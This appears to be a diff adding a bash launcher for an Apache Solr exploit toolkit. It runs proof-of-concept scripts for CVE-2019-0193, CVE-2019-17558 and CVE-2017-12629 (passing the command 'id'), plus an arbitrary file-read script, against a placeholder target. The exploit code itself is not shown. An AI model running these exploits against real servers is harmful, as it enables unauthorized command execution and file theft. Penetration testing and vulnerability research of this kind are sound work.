@@ -1,0 +1,11 @@
+#!/usr/bin/bash
+#SHELL_FOLDER=$(cd "$(dirname "$0")";pwd)
+SHELL_FOLDER=$(env | grep solr | sed 's/solrpoc=//')
+#echo $SHELL_FOLDER
+
+
+#RUN
+python3 $SHELL_FOLDER/cve-2019-0193.py <url>:<port>
+python3 $SHELL_FOLDER/cve-2019-17558.py <url>:<port>
+python3 $SHELL_FOLDER/cve-2017-12629.py <url>:<port> name "id"
+python3 $SHELL_FOLDER/solr_arbitrary_file_read_vulnerability.py <url>:<port>
